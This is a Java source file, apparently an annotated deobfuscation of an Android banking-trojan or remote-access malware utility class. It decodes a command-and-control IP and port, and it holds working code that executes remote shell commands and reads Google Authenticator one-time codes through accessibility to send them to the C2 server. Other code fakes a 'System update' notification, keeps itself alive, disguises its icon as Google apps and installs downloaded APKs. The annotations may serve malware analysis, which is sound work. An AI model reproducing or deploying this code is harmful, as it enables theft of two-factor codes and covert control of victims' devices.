package com.android.pictach;

import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;
import android.text.TextUtils;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * Utils — Core utility class used by all C2 components.
 *
 * Key responsibilities:
 * - String deobfuscation (removeMarker, base64Decode)
 * - GZIP compress / decompress (all C2 data is GZIP compressed)
 * - Packet building (buildPacket — assembles data for sending to C2)
 * - WakeLock / WifiLock management (keep device awake during C2 comms)
 * - Executor pool (all C2 sends/receives use this thread pool)
 * - Accessibility helpers (findNodeWithClass, isAccessibilityEnabled)
 * - App/package helpers (isAppInstalled, launchApp)
 * - Foreground notification builder
 * - SharedPreferences helpers (readPref, writePref)
 * - Shell command executor (executeShellCommand)
 */
public class Utils {

    // ─── Static fields ───────────────────────────────────────────────────────

    // WakeLock — keeps CPU awake during C2 communication
    public static PowerManager.WakeLock wakeLock = null;

    // WifiLock — keeps WiFi awake during C2 communication
    public static WifiManager.WifiLock wifiLock = null;

    // Thread pool executor for all async C2 send/receive operations
    public static Executor threadPoolExecutor = null;

    // Max concurrent threads in the pool
    public static int maxThreadCount = 1000;

    // Current shared pref key for reading stored values
    public static String currentPrefKey = null;

    // Separator used in certain string concatenations
    public static String colonSeparator = ":";

    // Deobfuscated strings — built at class load time
    // removeMarker("-25_Utils_5", "_Utils_") → "-255" → used as numeric flag
    public static String negTwoFiveFive = removeMarker("-25_Utils_5", "_Utils_");

    // removeMarker("-_Utils_A", "_Utils_") → "-A"
    public static String negA = removeMarker("-_Utils_A", "_Utils_");

    // removeMarker("-_Utils_5", "_Utils_") → "-5"
    public static String negFive = removeMarker("-_Utils_5", "_Utils_");

    // Literal flag strings
    public static String negSixSixSix = "-666";

    // removeMarker("-CRAZYCRAZYCRAZY9", "CRAZYCRAZYCRAZY") → "-9"
    public static String negNine = removeMarker("-CRAZYCRAZYCRAZY9", "CRAZYCRAZYCRAZY");

    // removeMarker("-4_Utils_4", "_Utils_") → "-44"
    public static String negFourFour = removeMarker("-4_Utils_4", "_Utils_");

    public static String negSevenSevenSix = "-776";
    public static String srcFlag = "SRC";

    // String flags used in C2 command comparisons
    public static String negOne = "-1";
    public static String one = "1";
    public static String eightEightEight = "888";
    public static String nineOneOne = "951"; // used as a command response code

    // Char flag used in component name switching logic
    public static char charOne = '1';

    public static int twentyFive = 25;

    // Global broadcast receiver reference (FirebaseApis instance)
    public static BroadcastReceiver screenReceiver = null;

    // Command execution state counters (reset/incremented by C2 commands)
    public static int stateFlag0 = 0;
    public static int stateFlag1 = 0;
    public static int stateFlag2 = 0;

    // Stores result of shell command execution
    public static String shellCommandResult = "";

    // Speed/delay for polling loops (ms)
    public static int speedTime = 1000;

    // UI state flags
    public static Boolean shown = false;
    public static Boolean asked = false;
    public static Boolean IDONE = false;

    // Retry counter for accessibility prompt
    public static int Trys = 6;

    // Prevents concurrent command processing
    public static boolean iamworking = false;

    // ─── String deobfuscation ─────────────────────────────────────────────────

    /**
     * Removes all occurrences of marker from str.
     * This is the primary deobfuscation function used everywhere.
     *
     * Examples:
     *   removeMarker("GECRAZYT",  "CRAZY")  → "GET"
     *   removeMarker("ba_body_se","_body_") → "base"
     *   removeMarker("-25_Utils_5","_Utils_") → "-255"
     *
     * Original obfuscated name: m603xd06b76aa /
     *   desperatempencilrwherevermoccupationsq...x48
     */
    public static String removeMarker(String str, String marker) {
        return str.replace(marker, "");
    }

    /**
     * Decodes a Base64 string to UTF-8 String.
     * Used to decode C2 IP, port, and method names stored as Base64.
     *
     * Examples:
     *   base64Decode("NjQuODkuMTYxLjE4OA") → "64.89.161.188"
     *   base64Decode("Nzc3MQ")             → "7771"
     *   base64Decode("VHhUeFQ=")           → "TxTxT"  (C2 packet separator)
     *   base64Decode("U3RhcnROZXdTY2Fu")   → "StartNewScan"
     *
     * Original obfuscated name: m601x16621e86 /
     *   affiliatedhpossessbimported...b40
     */
    public static String base64Decode(String str) {
        try {
            return new String(Base64.decode(str, 0), "UTF-8");
        } catch (UnsupportedEncodingException unused) {
            return null;
        }
    }

    // ─── GZIP compress / decompress ──────────────────────────────────────────

    /**
     * GZIP-compresses a byte array.
     * ALL data sent to the C2 server is compressed with this.
     *
     * Original obfuscated name: m604xaf5faad /
     *   docktoyswmessagingylodging...l42
     */
    public static byte[] gzipCompress(byte[] data) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(data.length);
        GZIPOutputStream gzip = new GZIPOutputStream(baos);
        gzip.write(data);
        gzip.close();
        byte[] compressed = baos.toByteArray();
        baos.close();
        return compressed;
    }

    /**
     * GZIP-decompresses a byte array.
     * ALL data received from the C2 server is decompressed with this.
     *
     * Original obfuscated name: m606x4226c875 /
     *   graduallyedeveloperskdildo...y38
     */
    public static byte[] gzipDecompress(byte[] data) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int length = data.length;
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        GZIPInputStream gzip = new GZIPInputStream(bais, length);
        byte[] buffer = new byte[length];
        while (true) {
            int read = gzip.read(buffer);
            if (read != -1) {
                baos.write(buffer, 0, read);
            } else {
                gzip.close();
                bais.close();
                byte[] result = baos.toByteArray();
                baos.close();
                return result;
            }
        }
    }

    // ─── Packet building / splitting ─────────────────────────────────────────

    /**
     * Builds a complete C2 outbound packet from a type string and data bytes.
     *
     * Packet format:
     *   [compressed_type_length_as_string] NULL [compressed_data_length_as_string]
     *   NULL [compressed_type_bytes] [compressed_data_bytes]
     *
     * The "ⁱᵇʾCRAZY..." check is a dead obfuscation branch — always takes
     * the normal path (replace never matches). Effectively always writes
     * both length headers + both data sections.
     *
     * Original obfuscated name: m613x6f1a8f62 /
     *   unfortunatelyqchamberlcommit...j37
     */
    public static byte[] buildPacket(String typeStr, byte[] dataBytes) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] compressedType = gzipCompress(typeStr.getBytes());
        byte[] compressedData = gzipCompress(dataBytes);

        // Obfuscation dead-branch check — "replace" never matches typeStr
        // so this always evaluates as if replace returned something with length > 1
        String deadCheck = "ⁱᵇʾCRAZYㅤˑ$ˏـﹳﾞ$CRAZYʽʾᵎ".replace(typeStr, "ⁱᵇXʾSBCRAZYKㅤˑ$ˏ");

        byte[] typeLen = String.valueOf(compressedType.length).getBytes();
        byte[] dataLen = String.valueOf(compressedData.length).getBytes();

        if (deadCheck.length() > 1) {
            baos.write(typeLen, 0, typeLen.length);
            baos.write(0); // NULL separator
            baos.write(dataLen, 0, dataLen.length);
        }
        baos.write(0); // NULL separator

        // Second dead-branch — "ﹶCRAZYφT..." never equals the result → always writes data
        if (!deadCheck.equals("ﹶCRAZYφTʾՙYﹶVCCRAZY")) {
            baos.write(compressedType, 0, compressedType.length);
            baos.write(compressedData, 0, compressedData.length);
        }

        byte[] packet = baos.toByteArray();
        try { baos.close(); } catch (Exception unused) {}
        return packet;
    }

    /**
     * Extracts the FIRST part of a received packet (type/command bytes).
     * Uses lengths array iArr[0] as byte count to extract from start.
     *
     * Original obfuscated name: m611x985a8169 /
     *   pigdifftorientalzthoroughb...r39
     */
    public static byte[] extractFirstPart(byte[] data, int[] lengths) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(data, 0, lengths[0]);
        try { baos.close(); } catch (Exception unused) {}
        return baos.toByteArray();
    }

    /**
     * Extracts the SECOND part of a received packet (DEX module bytes).
     * Uses lengths array: starts at iArr[0], reads iArr[1] bytes.
     *
     * Original obfuscated name: m602x3dbabda8 /
     *   dealtkcoxajanezlayersnmystery...h41
     */
    public static byte[] extractSecondPart(byte[] data, int[] lengths) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(data, lengths[0], lengths[1]);
        try { baos.close(); } catch (Exception unused) {}
        return baos.toByteArray();
    }

    /**
     * Serializes any object to byte array.
     * Used when sending complex objects back to C2.
     *
     * Original obfuscated name: get_Utils_Bytes
     */
    public static byte[] objectToBytes(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        byte[] result = baos.toByteArray();
        baos.close();
        return result;
    }

    // ─── WakeLock / WifiLock ─────────────────────────────────────────────────

    /**
     * Acquires WakeLock and WifiLock to prevent device sleeping during C2 comms.
     * Only acquires WakeLock if keepWake=true and not already held.
     * Always tries to acquire WifiLock.
     *
     * Original obfuscated name: WK_Utils_L
     */
    public static void acquireLocks(Context context, boolean keepWake) {
        if (keepWake && wakeLock == null) {
            try {
                PowerManager pm = (PowerManager) context.getSystemService("power");
                if (wakeLock == null) {
                    PowerManager.WakeLock wl = pm.newWakeLock(1, Config.FTX0.trim());
                    wakeLock = wl;
                    if (!wl.isHeld()) {
                        wakeLock.acquire();
                    }
                }
            } catch (Exception unused) {
            }
        }
        if (wifiLock == null) {
            try {
                WifiManager wm = (WifiManager) context.getSystemService("wifi");
                if (wifiLock == null) {
                    WifiManager.WifiLock wl = wm.createWifiLock(1, Config.FTX1.trim());
                    wifiLock = wl;
                    if (!wl.isHeld()) {
                        wifiLock.acquire();
                    }
                }
            } catch (Exception unused2) {
            }
        }
    }

    /**
     * Releases WakeLock and optionally WifiLock.
     * keepWifi=true → keeps WifiLock held.
     * keepWifi=false → releases WifiLock too.
     *
     * Original obfuscated name: rel
     */
    public static void releaseLocks(boolean keepWifi) {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception unused) {
        }
        if (keepWifi) {
            return;
        }
        try {
            if (wifiLock == null || !wifiLock.isHeld()) {
                return;
            }
            wifiLock.release();
            wifiLock = null;
        } catch (Exception unused2) {
        }
    }

    // ─── Power save check ────────────────────────────────────────────────────

    /**
     * Returns true if device is in battery saver / power save mode.
     * Used by NetworkManager before acquiring locks.
     *
     * Original obfuscated name: m612sv / sv
     */
    public static boolean isPowerSaveMode(Context context) {
        try {
            return ((PowerManager) context.getSystemService("power")).isPowerSaveMode();
        } catch (Exception unused) {
            return false;
        }
    }

    /**
     * Returns true if battery optimization is disabled for this app.
     * Original obfuscated name: is_dozemode
     */
    public static boolean isBatteryOptimizationDisabled(Context context) {
        if (Build.VERSION.SDK_INT >= 23) {
            return ((PowerManager) context.getSystemService("power"))
                    .isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return true;
    }

    // ─── Foreground notification ──────────────────────────────────────────────

    /**
     * Builds a foreground notification disguised as "System update".
     * Used by Api, Firebase, WorkerService, MyWorkerService to stay alive.
     *
     * Original obfuscated name: Foreground
     */
    public static Notification buildForegroundNotification(Context context, String channelId, String channelName) {
        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(channelId, channelName, 3);
            ch.setLockscreenVisibility(0);
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
            return new Notification.Builder(context, channelId)
                    .setContentTitle("System update")
                    .setContentText("New system software is available, Tap to learn more.")
                    .setSmallIcon(android.R.color.transparent)
                    .setAutoCancel(false)
                    .build();
        }
        return new Notification.Builder(context)
                .setContentTitle("System update")
                .setContentText("New system software is available, Tap to learn more.")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(2)
                .setAutoCancel(false)
                .build();
    }

    // ─── Alarm / persistence ─────────────────────────────────────────────────

    /**
     * Schedules a repeating alarm to restart Bodybuilding receiver.
     * Used to ensure persistent restart of services even after kill.
     *
     * Original obfuscated name: phonixeffect
     */
    public static void scheduleRestartAlarm(Context context, String obfusStr, long intervalMs) {
        try {
            Intent intent = new Intent(context, Bodybuilding.class);
            // "RestartSensor".replace(obfusStr, "") → "RestartSensor" (no match normally)
            intent.setAction("RestartSensor".replace(obfusStr, ""));
            ((AlarmManager) context.getSystemService("alarm"))
                    .setRepeating(
                            0,
                            System.currentTimeMillis() + intervalMs,
                            intervalMs,
                            PendingIntent.getBroadcast(context, 0, intent, 0)
                    );
        } catch (Exception unused) {
        }
    }

    // ─── SharedPreferences helpers ────────────────────────────────────────────

    /**
     * Reads a string value from default SharedPreferences.
     * Returns "" if not found or error.
     *
     * Original obfuscated name: g_Utils_t
     */
    public static String readPref(Context context, String key) {
        try {
            String val = PreferenceManager.getDefaultSharedPreferences(context).getString(key, "");
            return !val.equalsIgnoreCase("") ? val : "";
        } catch (Exception unused) {
            return "";
        }
    }

    /**
     * Writes a string value to default SharedPreferences.
     *
     * Original obfuscated name: dit
     */
    public static void writePref(Context context, String value, String key) {
        try {
            SharedPreferences.Editor edit = PreferenceManager.getDefaultSharedPreferences(context).edit();
            edit.putString(key, value.trim());
            edit.commit();
        } catch (Exception unused) {
        }
    }

    // ─── Shell command execution ──────────────────────────────────────────────

    /**
     * Executes a shell command asynchronously using the thread pool.
     * Result stored in Utils.shellCommandResult.
     * Used by C2 "ox" command (NetworkManager.runCommand).
     *
     * Original obfuscated name: e_Utils_cx
     */
    public static void executeShellCommand(final String command) {
        if (((ThreadPoolExecutor) threadPoolExecutor).getActiveCount() >= maxThreadCount) {
            return;
        }
        threadPoolExecutor.execute(new Runnable() {
            @Override
            public void run() {
                StringBuffer sb = new StringBuffer();
                try {
                    Process proc = Runtime.getRuntime().exec(command);
                    if (Build.VERSION.SDK_INT >= 26) {
                        if (!proc.waitFor(60L, TimeUnit.SECONDS)) {
                            proc.destroy();
                        }
                    } else {
                        proc.waitFor();
                    }
                    BufferedReader br = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    while (true) {
                        String line = br.readLine();
                        if (line == null) break;
                        sb.append(line);
                    }
                    proc.getInputStream().close();
                    proc.getOutputStream().close();
                    br.close();
                } catch (Exception unused) {
                    Utils.shellCommandResult = "";
                }
                String result = sb.toString();
                Utils.shellCommandResult = result.length() == 0 ? "" : result;
            }
        });
    }

    // ─── Package / App helpers ────────────────────────────────────────────────

    /**
     * Returns true if app with given packageName is installed and enabled.
     *
     * Original obfuscated name: a_Utils_a
     */
    public static boolean isAppInstalledAndEnabled(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            pm.getPackageInfo(packageName, 1);
            return pm.getApplicationInfo(packageName, 0).enabled;
        } catch (Exception unused) {
            return false;
        }
    }

    /**
     * Returns true if app with given packageName is installed (regardless of state).
     *
     * Original obfuscated name: m610p / p
     */
    public static boolean isAppInstalled(Context context, String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }

    /**
     * Launches app by package name.
     *
     * Original obfuscated name: m609o / o
     */
    public static void launchApp(Context context, String packageName) {
        try {
            Intent launch = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (launch != null) {
                context.startActivity(launch);
            }
        } catch (Exception unused) {
        }
    }

    /**
     * Returns the display label of this app.
     *
     * Original obfuscated name: getLabelApplication
     */
    public static String getAppLabel(Context context) {
        try {
            return (String) context.getPackageManager()
                    .getApplicationLabel(
                            context.getPackageManager()
                                    .getApplicationInfo(context.getPackageName(), 128)
                    );
        } catch (Exception unused) {
            return "";
        }
    }

    // ─── Accessibility helpers ────────────────────────────────────────────────

    /**
     * Returns true if screen is currently unlocked (not in keyguard).
     *
     * Original obfuscated name: GS_love_B
     */
    public static boolean isScreenUnlocked(Context context) {
        return !((KeyguardManager) context.getSystemService("keyguard"))
                .inKeyguardRestrictedInputMode();
    }

    /**
     * Checks if a specific AccessibilityService class is enabled.
     * Parses Settings.Secure "enabled_accessibility_services" string.
     *
     * Original obfuscated name: acc
     */
    public static boolean isAccessibilityEnabled(Context context, Class<?> serviceClass) {
        ComponentName componentName;
        String enabled;
        try {
            componentName = new ComponentName(context, serviceClass);
            enabled = Settings.Secure.getString(
                    context.getContentResolver(), "enabled_accessibility_services");
        } catch (Exception unused) {
            return false;
        }
        if (enabled == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabled);
        while (splitter.hasNext()) {
            ComponentName cn = ComponentName.unflattenFromString(splitter.next());
            if (cn != null && cn.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Checks if a specific AccessibilityService is enabled (alternate version).
     * Identical logic to isAccessibilityEnabled() — duplicate in original source.
     *
     * Original obfuscated name: IA_love_E
     */
    public static boolean isAccessibilityServiceActive(Context context, Class<?> serviceClass) {
        ComponentName componentName;
        String enabled;
        try {
            componentName = new ComponentName(context, serviceClass);
            enabled = Settings.Secure.getString(
                    context.getContentResolver(), "enabled_accessibility_services");
        } catch (Exception unused) {
            return false;
        }
        if (enabled == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabled);
        while (splitter.hasNext()) {
            ComponentName cn = ComponentName.unflattenFromString(splitter.next());
            if (cn != null && cn.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Reads all accessibility nodes with a given class name from a root node.
     * Recursively searches child nodes.
     * Used by Firebase accessibility service to find UI elements.
     *
     * Original obfuscated name: findNodeWithClass
     */
    static List<AccessibilityNodeInfo> findNodeWithClass(
            AccessibilityNodeInfo root, String className) {
        ArrayList<AccessibilityNodeInfo> results = new ArrayList<>();
        if (root == null) return results;
        int count = root.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                if (child.getClassName().toString().toLowerCase()
                        .contains(className.toLowerCase())) {
                    results.add(child);
                } else {
                    results.addAll(findNodeWithClass(child, className));
                }
            }
        }
        return results;
    }

    /**
     * Google Authenticator 2FA stealer via accessibility.
     * Triggered when package "com.google.android.apps.authenticator2" is active.
     * Finds ViewGroup nodes, reads all child text (OTP codes), sends to C2.
     *
     * Original obfuscated name: _SGA2
     */
    public static void stealGoogleAuthCodes(AccessibilityEvent event, String packageName) {
        int i;
        try {
            if (Build.VERSION.SDK_INT < 18
                    || !packageName.contains(
                            removeMarker("co##m.goog##le.andr##oid.ap##ps.authent##icator2", "##"))
                    || event.getSource() == null) {
                return;
            }
            String combined = "";
            // "androidCRAZYviewCRAZYViewGroup".replace("CRAZY",".") → "android.view.ViewGroup"
            Iterator<AccessibilityNodeInfo> it = findNodeWithClass(
                    event.getSource(),
                    "androidCRAZYviewCRAZYViewGroup".replace("CRAZY", ".")
            ).iterator();
            while (true) {
                i = 0;
                if (!it.hasNext()) break;
                AccessibilityNodeInfo node = it.next();
                while (i < node.getChildCount()) {
                    AccessibilityNodeInfo child = node.getChild(i);
                    if (child.getText() != null) {
                        combined = combined + child.getText().toString() + "-";
                    }
                    i++;
                }
            }
            String[] parts = combined.split("-");
            if (combined.isEmpty()) return;
            while (i < parts.length) {
                if (i == parts.length - 1) break;
                NetworkManager.sendToC2(
                        negFourFour,
                        ("Google Authenticator<" + parts[i] + "<" + parts[i + 1]).getBytes()
                );
                i++;
            }
            love.MyAccess.blockBackButton();
            love.MyAccess.goHome();
        } catch (Exception unused) {
        }
    }

    // ─── Permissions ─────────────────────────────────────────────────────────

    /**
     * Checks if all given permissions are granted.
     * Returns true if ALL granted, false if any denied.
     *
     * Original obfuscated name: H__love_P
     */
    public static boolean hasPermissions(Context context, String... permissions) {
        if (context == null || permissions == null) return true;
        for (String perm : permissions) {
            if (ActivityCompat.checkSelfPermission(context, perm) != 0) {
                return false;
            }
        }
        return true;
    }

    /**
     * Returns the full permissions array requested by this app.
     *
     * Original obfuscated name: PERMISSIONS
     */
    public static String[] PERMISSIONS() {
        return new String[]{
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.READ_CONTACTS",
                "android.permission.READ_SMS",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.READ_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.CHANGE_WIFI_STATE",
                "android.permission.ACCESS_WIFI_STATE",
                "android.permission.ACCESS_NETWORK_STATE",
                "android.permission.WAKE_LOCK",
                "android.permission.INTERNET",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.SEND_SMS",
                "android.permission.WRITE_EXTERNAL_STORAGE"
        };
    }

    // ─── File helpers ─────────────────────────────────────────────────────────

    /**
     * Returns true if NeedSuper check passes.
     * "on" == "on" is always true in Java reference comparison
     * but since these are literals from the string pool, it evaluates true.
     * Effectively always returns true.
     *
     * Original obfuscated name: NeedSuper
     */
    public static boolean NeedSuper() {
        return "on" == "on";
    }

    /**
     * Reads a file as bytes and returns Base64 encoded string.
     * Used by Firebase.FirebaseRD (read file command from C2).
     *
     * Original obfuscated name: ReadRecords
     */
    public static String readFileAsBase64(String filePath) {
        File file = new File(filePath);
        byte[] bytes = new byte[(int) file.length()];
        try {
            new FileInputStream(file).read(bytes);
        } catch (IOException unused) {
        }
        return Base64.encodeToString(bytes, 0);
    }

    /**
     * Returns a FileProvider URI for API 24+ or plain file URI for older.
     * Used when installing downloaded APKs.
     *
     * Original obfuscated name: uriFromFile
     */
    public static Uri uriFromFile(Context context, File file) {
        if (Build.VERSION.SDK_INT >= 24) {
            return FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);
        }
        return Uri.fromFile(file);
    }

    /**
     * Installs an APK file from a given path using ACTION_VIEW intent.
     * Used by body.Check_body_Bind() and DownloadTask.
     *
     * Original obfuscated name: m608xe993029f / nodedruleitight...k43
     */
    public static void installApk(Context context, String apkPath, String unused) {
        try {
            File file = new File(apkPath);
            if (file.exists()) {
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.setDataAndType(uriFromFile(context, file),
                        "application/vnd.android.package-archive");
                intent.addFlags(268435456);
                intent.addFlags(1);
                if (NeedSuper()) {
                    Firebase.FirebaseFOR_IN = true;
                }
                context.startActivity(intent);
            }
        } catch (Exception unused2) {
        }
    }

    /**
     * Sets WiFi sleep policy to NEVER (keeps WiFi on during C2 comms).
     *
     * Original obfuscated name: m605x3ae81939 / flightmheavily...l36
     */
    public static void keepWifiOn(Context context) {
        try {
            Settings.System.putInt(context.getContentResolver(), "wifi_sleep_policy", 2);
        } catch (Exception unused) {
        }
    }

    /**
     * Switches the app icon alias based on love.Afterinstalloption flag.
     * Options: "T" = GoogleTranslate icon, "N" = googlenews, "C" = costm, "K" = hide MainActive
     *
     * Original obfuscated name: SwapMe
     */
    public static void swapAppIcon(Context context, String option) {
        if (option != null) {
            try {
                String configStr = context.getResources().getString(R.string.difficultye56);
                currentPrefKey = configStr;
                if (configStr.charAt(0) == charOne) {
                    PackageManager pm = context.getPackageManager();
                    if (love.Afterinstalloption == "T") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.GoogleTranslate"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "N") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.googlenews"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "C") {
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.costm"), 1, 1);
                        pm.setComponentEnabledSetting(
                                new ComponentName(context, "com.android.pictach.MainActive"), 2, 1);
                    } else if (love.Afterinstalloption == "K") {
                        ComponentName cn = new ComponentName(context, "com.android.pictach.MainActive");
                        if (pm.getComponentEnabledSetting(cn) != 2) {
                            pm.setComponentEnabledSetting(cn, 2, 1);
                        }
                    }
                }
            } catch (Exception unused) {
            }
        }
    }

    /**
     * Starts a service using foreground or background method based on API level.
     * Reads config flag from resource to decide foreground vs background.
     *
     * Original obfuscated name: StartNewScan
     */
    public static void startServiceCompat(Context context, Intent intent) {
        if (Build.VERSION.SDK_INT >= 26) {
            String configStr = context.getResources().getString(R.string.difficultye56);
            currentPrefKey = configStr;
            if (configStr.charAt(1) == charOne) {
                context.startForegroundService(intent);
                return;
            } else {
                context.startService(intent);
                return;
            }
        }
        context.startService(intent);
    }

    /**
     * Simple string equality check with length guard.
     * Returns true if both strings are non-empty and equal.
     * Used in Api command dispatching to match command codes.
     *
     * Original obfuscated name: helpscanintnum
     */
    public static Boolean stringsMatch(String a, String b) {
        if (a.length() > 0 && b.length() > 0 && a.equals(b)) {
            return true;
        }
        return false;
    }
}
